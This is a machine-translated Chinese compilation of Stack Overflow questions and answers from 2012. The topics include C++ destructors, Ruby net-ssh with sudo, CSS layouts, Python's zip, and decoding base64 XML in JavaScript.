> 标签：c++, destructor

以下代码将导致[C4624](http://msdn.microsoft.com/en-us/library/fthdf523.aspx)。但是你可以看到 D 不是 B 的子类。为什么仍然得到这个警告？谢谢！

```
class B {
// Uncomment the following line to resolve.
// public:
~B();
};

class D  {B b;};   // C4624 B's destructor not public 
```

有关警告的更多详细信息：

[C4624](http://msdn.microsoft.com/en-us/library/fthdf523.aspx)：“派生类”：无法生成析构函数，因为基类析构函数不可访问

析构函数在基类中不可访问，因此不会为派生类生成。任何在堆栈上创建此类型对象的尝试都将导致编译器错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:24:17.980

类成员由类的构造函数初始化并由其析构函数销毁。因此，它们的构造函数和析构函数必须在这些函数中是可访问的。

在您的示例中，`B`有一个私有析构函数，因此无法访问 的析构函数`D`，这需要它销毁其类型的成员`B`。

我不知道为什么错误消息指的是“基类”。如果您从发布的代码中收到该错误消息，那么您的编译器可以对其诊断进行一些改进。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:27:07.153

因为班级`D`不是班级的朋友，班级`B`也不`B`是班级的一部分`D`。这意味着`B`' 的私有部分无法从`D`. 这也意味着您不能创建类型`D`或堆栈上的对象，因为当对象超出范围并应该被删除时，`B`它需要析构函数可访问。`B`请注意，错误消息似乎不正确，就像@R.MartinhoFernandes 准确提到的那样。[如果您自己管理内存（如此处所述](https://stackoverflow.com/questions/631783/what-is-the-use-of-having-destructor-as-private)） ，则可以使用私有析构函数。

# ruby - 如何在 Ruby 中使用 net-ssh sudo su

> ID：13704836
> 
> 赞同：6
> 
> 时间：2012-12-04T14:11:34.267
> 
> 标签：ruby, sudo, su, net-ssh

我试图弄清楚如何`sudo su - #{su_user}`在 Ruby 之后发送多个 net-ssh 命令链。

我当前的代码在下面，并与`sudo su`命令一起挂起，即使在`send_data "#{password}\n"`.

同时，在系统上，手动执行`sudo su - admin2`不需要输入密码。

任何帮助，将不胜感激！

* * *

```
require 'rubygems'  
require 'net/ssh'
host = 'hostA'

user = 'admin'
password = 'hostA_pwd'
su_user = 'Admin2'

Net::SSH.start(host, user, :password => password) do |ssh|

     ssh.open_channel do |channel|  
       channel.request_pty do |c, success|
         raise "could not request pty" unless success

         channel.exec "pwd; whoami; sudo su - #{su_user} ; pwd ; whoami"
         channel.on_data do |c_, data|
           if data =~ /\[sudo\]/ || data =~ /Password/i
             channel.send_data "#{password}\n"
           else       
             result << data
           end
         end
         puts result
       end
     end
     ssh.loop
  end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:58:54.677

`sudo`支持该`-c`选项，该选项将命令传递给子 shell。以下是一些`sudo`可能对您有用的标志：

```
-c, --command=COMMAND
      pass a single COMMAND to the shell with -c

--session-command=COMMAND
      pass a single COMMAND to the shell with -c and do not create a new session

-m, --preserve-environment
      do not reset environment variables

-s, --shell=SHELL
      run SHELL if /etc/shells allows it 
```

所以，使用类似的东西`sudo su someuser -c 'ls;date'`，你会执行命令`ls`和`date`as `someuser`。在该主机上的命令行上尝试一下，以了解您可以做什么，然后将其应用于您的 SSH 会话。

有关`man sudo`更多信息，请参阅。

此外，就像编码提示一样，您可以减少：

```
if data =~ /\[sudo\]/ || data =~ /Password/i 
```

到：

```
if (data[/\[sudo\]|Password/i]) 
```

# facebook - 西里尔文分享网址时出错

> ID：13704841
> 
> 赞同：7
> 
> 时间：2012-12-04T14:11:52.050
> 
> 标签：facebook, share-button

无法以西里尔文分享网址：`http://вода-серебряная.рф`. 我的网站`facebook.com/sharer/sharer.php`用来实现这一点。在此步骤中，该 url 已`http://xn----7sbbdcmja7ed0aci5rc.xn--p1ai/`使用 FB 转换为 punycode ( )。

当我单击`Share Link`时，返回错误并显示以下消息：`Could not post to Wall. The message could not be posted to this Wall`。

我还检查了网址，`developers.facebook.com/tools/debug`它返回了以下错误：（`Error Linting URL: An internal error occurred while linting the URL`见[结果](https://graph.facebook.com/155637944578331)）。

是FB错误还是我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T23:38:08.197

Facebook 目前未设置为支持国际化域名。如果您在[Bugs Tool](https://developers.facebook.com/bugs)提交它，它将作为功能请求在那里被跟踪。

**编辑**- 已知问题 - [https://developers.facebook.com/bugs/466343236740917](https://developers.facebook.com/bugs/466343236740917)

# html - 图像溢出修复？

> ID：13704847
> 
> 赞同：0
> 
> 时间：2012-12-04T14:12:11.850
> 
> 标签：html, css

我有两列；第一列是图像，第二列是细节。

我的问题是图像溢出到下一行

添加溢出：自动；或内联块；到 div.portfolioitems_wrap 对我没有帮助

[列表 http://img577.imageshack.us/img577/7002/screenshot20121204at135.png](http://img577.imageshack.us/img577/7002/screenshot20121204at135.png)

**制作者**

```
 <div class="portfolioitems_wrap">
 <div class="portfolioitems_column1">first image</div>
 </div>
 <div class="portfolioitems_column2">information of the institute</div>
 <div class="portfolioitems_wrap">
 <div class="portfolioitems_column1">first image</div>
 </div>
 <div class="portfolioitems_column2">information of the institute</div>
 <div class="portfolioitems_wrap">
 <div class="portfolioitems_column1"><img src="/image/nature.jpg" class="thumbnail" alt="nature" />
 </div>
 </div>
 <div class="portfolioitems_column2">information of the institute
 </div>
 <div class="portfolioitems_wrap">
 <div class="portfolioitems_column1">first image</div>
 </div>
 <div class="portfolioitems_column2">information of the institute</div>
 <div class="clear"></div> 
```

**CSS**

```
 div.portfolioitems_wrap{
float: left;
width:100%;
color:#555555;
border-bottom: 1px solid #eee;
height: 1.5em;
margin-bottom: 1em;
}

 div.portfolioitems_column1{
margin-right: 10px;
}
 div.portfolioitems_column2{
float: left;
color:#555555;
width: 300px;
margin-left: -300px;
font-size: 80%;
}

 div.portfolioitems_column1 .thumbnail 
{
    float:left;
    margin-right:20px;
    border:1px solid #979390;
    width:80px;
    margin-bottom: 5px;
}

 div.clear{
clear: both;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:20:13.877

除了我上面的评论：http: [//jsfiddle.net/hp7dY/](http://jsfiddle.net/hp7dY/)

似乎`min-height`足以解决这个问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:54:26.677

看起来您的 DIV 组织有点混乱，这增加了您的问题。我假设portfolioitems_wrap DIV 应该包含两列。也就是说，问题更多在于您要固定每个表格行的高度，而不是让它根据内容变得灵活。

去除高度：1.5em；entry from 允许您的元素适合 DIV。您还可以考虑将列元素显示为内联块。

```
div.portfolioitems_wrap{
    float: left;
    width:100%;
    color:#555555;
    border-bottom: 1px solid #eee;
    // height: 1.5em;
    margin-bottom: 1em;
}   

div.portfolioitems_column1{
    margin-right: 10px;
    display:inline-block;
    width:100px;     
    float:left;
}  

div.portfolioitems_column2{
    color:#555555;
    font-size: 80%;
    display:inline-block;
    width:300px;
    float:left;
}   

div.portfolioitems_column1 .thumbnail  {     
    float:left;     
    border:1px solid #979390;     
    width:80px;     
    margin: 0px 10px 5px 10px;
}    

div.clear{
    clear: both;
} 
```

这是一个工作小提琴，并进行了一些其他小的调整以使其漂亮：

[http://jsfiddle.net/72HML/](http://jsfiddle.net/72HML/)

希望有帮助。

# c# - 离开多播组时通知

> ID：13704851
> 
> 赞同：1
> 
> 时间：2012-12-04T14:12:21.213
> 
> 标签：c#, sockets, udp, multicast, udpclient

我在多播组上设置了一个侦听器

```
udpclient.JoinMulticastGroup(multicastaddress, localIpAddress);
while(listeing)
    data = udpclient.receive(ref remoteep); 
```

当同一个多播组中的其他成员离开时，我不会收到通知。我在 IGMP 协议下的wireshark 中看到了它。

当成员离开我的 c# 侦听器上的多播组时，如何通知我？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:05:37.783

你不能。在 C 级别没有针对它的 API，因此无法在更高级别实现 API。

# windows-phone-7 - Windows Phone 7 将数据附加到 XAP 文件

> ID：13704854
> 
> 赞同：0
> 
> 时间：2012-12-04T14:12:33.240
> 
> 标签：windows-phone-7, packaging, xap

我正在开发一个音乐应用程序，经过长时间的测试，我得出的结论是，对于第一次运行，我必须在 XAP 文件中加载关卡数据，而不是从 Web 服务下载它，因为它更快且不那么耗时.

我的问题是，是否有人知道读取应用程序文件夹中文件列表的方法。

我编写了一种方法，将数据从一个文件夹复制到应用程序的 LocalStorage (IsolatedStorage)，我需要的只是一种读取文件夹内容的方法。

不得不提的是，这是我的第一个 windows phone 应用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T01:00:09.760

如果文件在应用程序文件夹中——这意味着它被打包在 xap 中——你应该能够使用 Application.GetRourceStream 来获取文件，就像我在应用程序中看到的那样，这些应用程序具有打包的本地数据库，但想要复制安装后转到隔离存储。

这是一个示例（来自此页面[http://msdn.microsoft.com/en-us/library/hh202860(v=vs.92).aspx](http://msdn.microsoft.com/en-us/library/hh202860(v=vs.92).aspx)）：

```
Stream str = Application.GetResourceStream(new Uri("appdata:/MyReferenceDB.sdf", UriKind.Relative)).Stream; 
```

appdata: 告诉它在应用程序目录中查找。只有其他选项是 isostore：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-05T00:08:27.083

所以您已经将文件从您的 xap 资源复制到独立存储，并且您想从独立存储中读取文件？（是否有理由不能将数据从 xap 中加载出来，而不将其复制到独立存储中？）

试试这个关于文件和隔离存储的教程：http: [//www.windowsphonegeek.com/tips/all-about-wp7-isolated-storage-read-and-save-text-files](http://www.windowsphonegeek.com/tips/all-about-wp7-isolated-storage-read-and-save-text-files)（我建议阅读整个内容，但我专门链接到有关创建和阅读文本文件的页面）。

此问题包含用于列出隔离存储中的文件的代码，如果您不能仅对文件名进行硬编码： [windows phone 7 File Listing IsolatedStorage](https://stackoverflow.com/questions/8344074/windows-phone-7-file-listing-isolatedstorage?rq=1)

# javascript - gridcomplete 函数总是运行？

> ID：13704855
> 
> 赞同：1
> 
> 时间：2012-12-04T14:12:34.220
> 
> 标签：javascript, grails, jqgrid

我将 jqgrid 与 grails 一起使用，需要选择一些对象。这适用于一个给定的对象。我的问题是，有时，调用函数没有 id。所以网格完成后没有什么可做的。即使在尝试 if (false)... 之后，我也无法做到这一点。在所有情况下，grid.jqgrid("setSelection... 被执行并且我收到消息

java.lang.NullPointerException 无法在空对象上获取属性“id”

这是真的。但是为什么要执行这条线？？？

```
gridComplete: function() {
  if (false) {
     grid.jqGrid("setSelection",'${cableFocus.id}',true);
  } 
```

返回;

我有第二个问题：如何使用 gridComplete 选择多行而不是一行？

非常感谢您的帮助，

奥利维尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T01:55:40.050

问题不在于 gridComplete 或您的 if 语句（即 javascript）。当您收到 java 错误时，我猜 ${cableFocus.id} 是占位符（它将始终被执行）

所以javascript没有运行，但你的java代码仍在尝试运行并抛出错误

# css - 用标题排列 Div

> ID：13704859
> 
> 赞同：0
> 
> 时间：2012-12-04T14:12:57.810
> 
> 标签：css

我试图并排堆叠 3 个 div。这是一个示例 div

```
<!-- This is first div -->
<div id="divone" style="text-align: center;">
<span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
   <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
   </div>
</div>
<!-- Similarly I need two more divs to be aligned sidebyside with div one --> 
```

如何使用**内联**CSS 来做到这一点？每个 div 的宽度可以是 200px，高度没有限制。

需要输出

```
--------------------    --------------------       --------------------
DIV ONE                    DIV TWO                      DIV THREE
--------------------     --------------------      --------------------

FORM ELEMENT                FORM ELEMENT                FORM ELEMENT

--------------------     --------------------     -------------------- 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:24:30.097

仅仅因为您不能更改样式表，并不意味着您必须使用丑陋的内联样式。

将此添加到您的`<head>`：

```
<style>
.three-columns{
  width: 100%; /* or any width you like */
}
.three-columns .column{
  float: left;
  width: 33%; /* or less if you're using margins, padding, borders, etc */
}
</style> 
```

然后在页面中，

```
<div class="three-columns">
  <div class="column"></div>
  <div class="column"></div>
  <div class="column"></div>
</div> 
```

您可以在头部的样式标签内完成所有额外的 css。（从技术上讲，我认为您可以在标题之外使用它，但尽量不要）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:40:48.423

尝试这个：

```
<ul style="list-style: none;"> 
<li>
    <div id="divone" style="">
        <span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
           <div style="text-align: center;">
             <form action="https://www.somesomesomesome.com" method="post">
             </form>
           </div>
    </div>
</li>    
<li>
     <div id="divtwo" style="">
        <span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
           <div style="text-align: center;">
             <form action="https://www.somesomesomesome.com" method="post">
             </form>
           </div>
    </div>
</li>    
<li>
     <div id="divthree" style="t">
        <span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
           <div style="text-align: center;">
             <form action="https://www.somesomesomesome.com" method="post">
             </form>
           </div>
    </div>
</li> 
```

演示在这里：http: [//jsfiddle.net/7MZqN/](http://jsfiddle.net/7MZqN/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:23:33.917

```
 <div id="divone" style="text-align: center; width:33.33333%; float:left;">
  <span style="font-size: 11pt;"><strong>Some Message Here</strong></span></div>
  <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
  </div>

 <div id="divtwo" style="text-align: center; width:33.33333%; float:left;">
  <span style="font-size: 11pt;"><strong>Some Message Here</strong></span></div>
  <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
  </div>

 <div id="divthree" style="text-align: center; width:33.33333%; float:left;">
  <span style="font-size: 11pt;"><strong>Some Message Here</strong></span></div>
  <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
  </div>

  <div style="clear:both;"></div><!-- this is a clearfix div --> 
```

**演示：http:** [//jsfiddle.net/EnkP5/](http://jsfiddle.net/EnkP5/)

更新：我刚刚看到您希望宽度为 200 像素的位置；将宽度从 33.33333% 更改为 200px；

确保所有这三个其他 div 所在的 div 宽度超过 600 像素。​</p>

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:24:19.767

将s 设置`display: inline-block;`为`div`并排，如下所示：

```
<div id="divone" style="text-align: center; display: inline-block; width: 200px;">
<span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
   <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
   </div>
</div>

<div id="divtwo" style="text-align: center; display: inline-block; width: 200px;">
<span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
   <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
   </div>
</div>

<div id="divthree" style="text-align: center; display: inline-block; width: 200px;">
<span style="font-size: 11pt;"><strong>Some Message Here</strong></span>
   <div style="text-align: center;">
     <form action="https://www.somesomesomesome.com" method="post">
     </form>
   </div>
</div> 
```

# python - Python 中的 Zip 列表

> ID：13704860
> 
> 赞同：179
> 
> 时间：2012-12-04T14:13:00.057
> 
> 标签：python, python-2.7

我正在尝试学习如何“压缩”列表。为此，我有一个程序，在某个特定点，我执行以下操作：

```
x1, x2, x3 = stuff.calculations(withdataa) 
```

这给了我三个列表，`x1`，`x2`和`x3`，每个列表，例如，大小为 20。

现在，我这样做：

```
zipall = zip(x1, x2, x3) 
```

但是，当我这样做时：

```
print "len of zipall %s" % len(zipall) 
```

我得到了 20，这不是我所期望的。我预计三个。我认为我做的事情根本上是错误的。

* * *

## 回答 #1

> 赞同：259
> 
> 时间：2012-12-04T14:15:11.510

当您`zip()`将三个列表组合在一起时，每个列表包含 20 个元素，结果有 20 个元素。每个元素都是一个三元组。

你自己看：

```
In [1]: a = b = c = range(20)

In [2]: zip(a, b, c)
Out[2]: 
[(0, 0, 0),
 (1, 1, 1),
 ...
 (17, 17, 17),
 (18, 18, 18),
 (19, 19, 19)] 
```

要找出每个元组包含多少个元素，您可以检查第一个元素的长度：

```
In [3]: result = zip(a, b, c)

In [4]: len(result[0])
Out[4]: 3 
```

当然，如果列表一开始是空的，这将不起作用。

* * *

## 回答 #2

> 赞同：72
> 
> 时间：2012-12-04T14:18:25.857

`zip`需要一堆喜欢的列表

```
a: a1 a2 a3 a4 a5 a6 a7...
b: b1 b2 b3 b4 b5 b6 b7...
c: c1 c2 c3 c4 c5 c6 c7... 
```

并将它们“压缩”到一个列表中，其条目为 3-tuples `(ai, bi, ci)`。想象一下从左到右水平画一条拉链。

* * *

## 回答 #3

> 赞同：43
> 
> 时间：2015-05-01T00:37:23.347

在 Python 2.7 中，这可能运行良好：

```
>>> a = b = c = range(20)
>>> zip(a, b, c) 
```

但在 Python 3.4 中它应该是（否则，结果将类似于`<zip object at 0x00000256124E7DC8>`）：

```
>>> a = b = c = range(20)
>>> list(zip(a, b, c)) 
```

* * *

## 回答 #4

> 赞同：29
> 
> 时间：2012-12-04T14:17:12.327

`zip`创建一个新列表，其中填充包含来自可迭代参数的元素的元组：

```
>>> zip ([1,2],[3,4])
[(1,3), (2,4)] 
```

我希望您尝试创建一个元组，其中每个元素都是一个列表。

* * *

## 回答 #5

> 赞同：20
> 
> 时间：2018-05-27T14:17:29.900

在**Python 3** `zip`中，它返回一个迭代器，并且需要传递给一个列表函数来获取压缩元组：

```
x = [1, 2, 3]; y = ['a','b','c']
z = zip(x, y)
z = list(z)
print(z)
>>> [(1, 'a'), (2, 'b'), (3, 'c')] 
```

然后对`unzip`他们来说，只需结合压缩迭代器：

```
x_back, y_back = zip(*z)
print(x_back); print(y_back)
>>> (1, 2, 3)
>>> ('a', 'b', 'c') 
```

如果需要原始形式的列表而不是元组：

```
x_back, y_back = zip(*z)
print(list(x_back)); print(list(y_back))
>>> [1,2,3]
>>> ['a','b','c'] 
```

* * *

## 回答 #6

> 赞同：14
> 
> 时间：2017-05-25T17:37:19.850

来源：[我的博客文章（更好的格式）](https://medium.com/@PrintSupWorld/unzipping-python-2-340701d300a6)

**例子**

```
numbers = [1,2,3]
letters = 'abcd'

zip(numbers, letters)
# [(1, 'a'), (2, 'b'), (3, 'c')] 
```

## **输入**

零个或多个可迭代对象 [1]（例如列表、字符串、元组、字典）

## **输出**（列表）

> 第一个元组=（数字元素_1，字母元素_1）
> 
> 第二个元组 =（e_2 个数字，e_2 个字母）
> 
> …
> 
> n-th tuple = (e_n 个数字, e_n 个字母)

1.  n 元组列表：n 是最短参数（输入）的长度
    *   len(numbers) == 3 < len(letters) == 4 → short= 3 → 返回 3 个元组
2.  每个元组的长度 = # of args（元组从每个 arg 中获取一个元素）
    *   args =（数字，字母）；len(args) == 2 → 包含 2 个元素的元组
3.  `i`元组 = (element_i arg1, element_i arg2…, element_i arg `n`)

## **边缘案例**

1) 空字符串：len(str)= 0 = 没有元组

2) 单个字符串：len(str) == 2 个元组，其中 len(args) == 1 个元素

```
zip()
# []
zip('')
# []
zip('hi')
# [('h',), ('i',)] 
```

* * *

## **拉链在行动！**

**1\. 从两个列表中构建一个字典 [2]**

```
keys = ["drink","band","food"]
values = ["La Croix", "Daft Punk", "Sushi"]

my_favorite = dict( zip(keys, values) )

my_favorite["drink"]
# 'La Croix'

my_faves = dict()
for i in range(len(keys)):
    my_faves[keys[i]] = values[i] 
```

*   `zip`是一个优雅、清晰、简洁的解决方案

**2.打印表格中的列**

“*” [3] 称为“解包”：`f(*[arg1,arg2,arg3]) == f(arg1, arg2, arg3)`

```
student_grades = [
[   'Morty'  ,  1   ,  "B"  ],
[   'Rick'   ,  4   ,  "A"  ],
[   'Jerry'  ,  3   ,  "M"  ],
[  'Kramer'  ,  0   ,  "F"  ],
]

row_1 = student_grades[0]
print row_1
# ['Morty', 1, 'B']

columns = zip(*student_grades)
names = columns[0]
print names
# ('Morty', 'Rick', 'Jerry', 'Kramer') 
```

* * *

## 额外信用：解压缩

`zip(*args)`被称为“解压缩”，因为它具有相反的效果`zip`

```
numbers = (1,2,3)
letters = ('a','b','c')

zipped = zip(numbers, letters)
print zipped
# [(1, 'a'), (2, 'b'), (3, 'c')]

unzipped = zip(*zipped)
print unzipped
# [(1, 2, 3), ('a', 'b', 'c')] 
```

*   `unzipped`: tuple_1 = 每个压缩元组的 e1。tuple_2 = 每个的 e2`zipped`

* * *

## 脚注

1.  一个能够一次返回一个成员的对象（例如列表 [1,2,3]、字符串 'I like codin'、元组 (1,2,3)、字典 {'a':1、'b' :2})
2.  {键1：值1，键2：值2 ...}
3.  “开箱” (*)

`*`代码：

```
# foo - function, returns sum of two arguments
def foo(x,y):
    return x + y
print foo(3,4)
# 7

numbers = [1,2]
print foo(numbers)
# TypeError: foo() takes exactly 2 arguments (1 given)

print foo(*numbers)
# 3 
```

`*`取`numbers`(1 arg) 并将其 2 个元素“解包”为 2 个 args

* * *

## 回答 #7

> 赞同：13
> 
> 时间：2014-07-19T19:17:55.253

Basically the zip function works on lists, tuples and dictionaries in Python. If you are using IPython then just type zip? And check what zip() is about.

If you are not using IPython then just install it: "pip install ipython"

For lists

```
a = ['a', 'b', 'c']
b = ['p', 'q', 'r']
zip(a, b) 
```

The output is `[('a', 'p'), ('b', 'q'), ('c', 'r')`

For dictionary:

```
c = {'gaurav':'waghs', 'nilesh':'kashid', 'ramesh':'sawant', 'anu':'raje'}
d = {'amit':'wagh', 'swapnil':'dalavi', 'anish':'mane', 'raghu':'rokda'}
zip(c, d) 
```

The output is:

```
[('gaurav', 'amit'),
 ('nilesh', 'swapnil'),
 ('ramesh', 'anish'),
 ('anu', 'raghu')] 
```

* * *

## 回答 #8

> 赞同：8
> 
> 时间：2016-11-20T21:52:56.507

为了完整起见。

当压缩列表的长度不相等时。结果列表的长度将成为最短的，没有任何错误发生

```
>>> a = [1]
>>> b = ["2", 3]
>>> zip(a,b)
[(1, '2')] 
```

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2020-02-23T13:57:22.767

值得在这里添加，因为它是 zip 上排名很高的问题。`zip`很棒，惯用的 Python - 但对于大型列表来说，它根本不能很好地扩展。

代替：

```
books = ['AAAAAAA', 'BAAAAAAA', ... , 'ZZZZZZZ']
words = [345, 567, ... , 672]

for book, word in zip(books, words):
   print('{}: {}'.format(book, word)) 
```

使用`izip`. 对于现代处理，它将其存储在 L1 高速缓存内存中，并且对于更大的列表而言性能要高得多。使用它就像添加一个`i`：

```
for book, word in izip(books, words):
   print('{}: {}'.format(book, word)) 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2018-05-08T15:23:18.463

我认为不会`zip`返回列表。`zip`返回一个生成器。你必须做得到`list(zip(a, b))`一个元组列表。

```
x = [1, 2, 3]
y = [4, 5, 6]
zipped = zip(x, y)
list(zipped) 
```

# xml - Json 中的 Base64 编码 Xml：Xml 标签丢失

> ID：13704862
> 
> 赞同：0
> 
> 时间：2012-12-04T14:13:12.647
> 
> 标签：xml, json, base64

我正在尝试在**javascript**中处理 json 文档。关键部分是 Json 文档有一个部分携带 base64 编码的 xml 数据。如果我采用 base64 编码数据并尝试对其进行解码，我会看到 xml 标签被修剪掉了。

例如：

我在 json 内容部分有这个 base64 字符串

`Jmx0O3RhZyZndDtjb250ZW50Jmx0Oy90YWcmZ3Q7`

如果您尝试使用每个 base64 工具对其进行解码，您将得到

`<tag>content</tag>`

相反，我只得到

`content`

从 xml 标签中丢失信息。我真的很需要他们，有什么建议吗？

编辑：你可以看到下面的**javascript**代码：

```
 var requestUrl = span.html();
    var data = JSON.parse(doAjaxGet(requestUrl));   //I get the json document
    if(data!=null)
    {
        var envelope = data.document.envelope[0]; 
        if(envelope!=null)
        {           
            if(envelope!=null)
            {
                var data = envelope.node.applicationData;
                if(data!=null)
                {
                    var li_d = ul.find('#data');
                    encodedData = data.value;
                    li_d.find('span').html(base64.decode(encodedData)); //here the encodeddata are decoded and the Xml tags are trimmed
                    li_d.show();
                } 
```

这是Json

```
 {
       "document":{
          "envelope":[
             {
                "node":{
                   "applicationData":{
                      "value":"PGJpekxvY2F0aW9uPml0LnVuaWZpLmRldC50ZWxlbWF0LmVwY2lzLmRvY3VtZW50LklkZW50aWZpZXJANmRlZWE5NmM8L2JpekxvY2F0aW9uPg=="
                   }
                }
             }
          ]
       }
    } 
```

在下面我将包含我用来编码/解码的库，但我认为它没有帮助，因为如果我执行这些步骤：

1.  从 json 复制 base64 有效负载
2.  将其粘贴到我用来处理文档的同一个js文件中，如下所示

`base64.decode('PGJpekxvY2F0aW9uPml0LnVuaWZpLmRldC50ZWxlbWF0LmVwY2lzLmRvY3VtZW50LklkZW50aWZpZXJANmRlZWE5NmM8L2JpekxvY2F0aW9uPg==')`

输出是正确的，即我在解码字符串中包含 xml 标记。所以我认为这些问题与我正在解码 json 文档中的某些内容有关。

顺便说一句，这里是图书馆

```
base64 = {

        // private property
        _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        // public method for encoding
        encode : function (input) {
            var output = "";
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;

            input = base64._utf8_encode(input);

            while (i < input.length) {

                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);

                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;

                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }

                output = output +
                this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
                this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

            }

            return output;
        },

        // public method for decoding
        decode : function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = base64._utf8_decode(output);

            return output;

        },

        // private method for UTF-8 encoding
        _utf8_encode : function (string) {
            string = string.replace(/\r\n/g,"\n");
            var utftext = "";

            for (var n = 0; n < string.length; n++) {

                var c = string.charCodeAt(n);

                if (c < 128) {
                    utftext += String.fromCharCode(c);
                }
                else if((c > 127) && (c < 2048)) {
                    utftext += String.fromCharCode((c >> 6) | 192);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
                else {
                    utftext += String.fromCharCode((c >> 12) | 224);
                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                    utftext += String.fromCharCode((c & 63) | 128);
                }

            }

            return utftext;
        },

        // private method for UTF-8 decoding
        _utf8_decode : function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while ( i < utftext.length ) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i+1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i+1);
                    c3 = utftext.charCodeAt(i+2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }

            return string;
        }

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:40:52.863

我在这里的回答有点过头了。但是，假设你对我最后一个问题的回答是**肯定**的......

创建或找到一个简单的 html 转义函数并通过它运行解码的数据，然后将其放到页面上。出于您的目的，我认为这可能非常简单。

```
var escapeTags = function(s) {
  return s.replace(/</g, "&lt;").replace(/>/g, "&gt");
} // escapeTags() 
```

将其放在页面上并没有太大变化：

```
li_d.find('span').html(escapeTags(base64.decode(encodedData))); 
```

# objective-c - UIViewController: [super init] 调用 [self initWithNibName bundle:]

> ID：13704865
> 
> 赞同：5
> 
> 时间：2012-12-04T14:13:23.520
> 
> 标签：objective-c, ios, uiviewcontroller, xib

我的 UIViewController 子类中有两个初始化函数：

```
- (id)init
{
    self = [super init];
    if (self)
    { 
           // Custom stuff
        return self;
    }
    return nil;
} 
```

和

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName: nibNameOrNil 
                           bundle: nibBundleOrNil];
    if (self) 
    {
        // Custom stuff
    }
    return self;
} 
```

我将 init 函数放入以避免调用 initWithNibName:bundle: 方法。我正在尝试取出 xib 文件。不幸的是，调用这个 init [[Myclass alloc] init] 通过调用 [super init] 调用 initWithNibName:bundle:。

首先，我应该在文档中的哪个位置阅读，以便我期望对父 init 方法的调用调用我自己的 initWithNibName:bundle: 方法？

其次，这对苹果来说是一个好的设计选择。我不明白为什么这是可取的行为？（可能是我在这里没有了解全局，所以请随时提示我。）

第三，我如何最好地绕过它。我只是从我的代码中取出 initWithNibName:bundle: 吗？从来没有这样的情况，我想选择使用 xib 或手动实例化类。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T14:20:00.133

通常我必须用托管对象上下文初始化我的视图控制器。我实现了一个简单`-(id)initWithContext:`的方法，我在其中调用了 super 的`initWithNibName:bundle:`方法。这样我就可以定义自己的 xib 名称。

